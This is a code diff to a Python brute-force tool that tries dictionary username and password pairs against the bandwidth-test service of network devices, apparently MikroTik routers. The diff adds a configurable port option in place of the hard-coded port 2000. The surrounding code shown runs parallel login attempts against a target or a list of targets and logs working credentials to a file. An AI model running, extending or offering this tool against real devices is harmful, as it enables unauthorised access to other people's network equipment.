@@ -27,6 +27,7 @@ creds = []
 number_of_threads = 10
 stop_after_good = False
 log = False
+btest_port = 2000
 
 # File name for good results
 results_filename = 'btest-brute.log'
@@ -55,7 +56,7 @@ def do_auth(host, user, password):
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.settimeout(TIMEOUT)
 	try:
-		s.connect((host, 2000))
+		s.connect((host, btest_port))
 	except:
 		print('[-] %s %s %s [CONNECT_ERROR]' % (host, user, password))
 		s.close()
@@ -122,7 +123,7 @@ def do_auth(host, user, password):
 def bruteforce(target):
 	result = []
 	for l, p in creds:
-		print('[*] Trying to connect to target: %s (%s:%s)' % (target, l, p))
+		print('[*] Trying to connect to target: %s:%s (%s:%s)' % (target, btest_port, l, p))
 		code = do_auth(target, l, p)
 		result.append((target, l, p, code))
 		if code == AUTH_GOOD:
@@ -168,6 +169,7 @@ if __name__ == '__main__':
 	parser = argparse.ArgumentParser(description='description')
 	parser.add_argument('-d', '--dict', help = 'A dictionary file', required = False)
 	parser.add_argument('-t', '--target', help = 'Target hostname', required = False)
+	parser.add_argument('-p', '--port', help = 'Bandwidth-test port', required = False)
 	parser.add_argument('-T', '--targets', help = 'Targets list filename', required = False)
 	parser.add_argument('-n', '--threads', type = int, help = 'Number of threads for parallel processing', required = False)
 	parser.add_argument('-S', '--stop-after-good', action = 'store_true', help = 'Stop login tries after good creds found for the target', required = False)
@@ -195,6 +197,9 @@ if __name__ == '__main__':
 
 	if args['threads']:
 		number_of_threads = args['threads']
+
+	if args['port']:
+		btest_port = int(args['port'])
 
 	if args['target'] and args['targets']:
 		print('Please specify --target/-t <hostname> or --targets/-T <filename>, but not both')
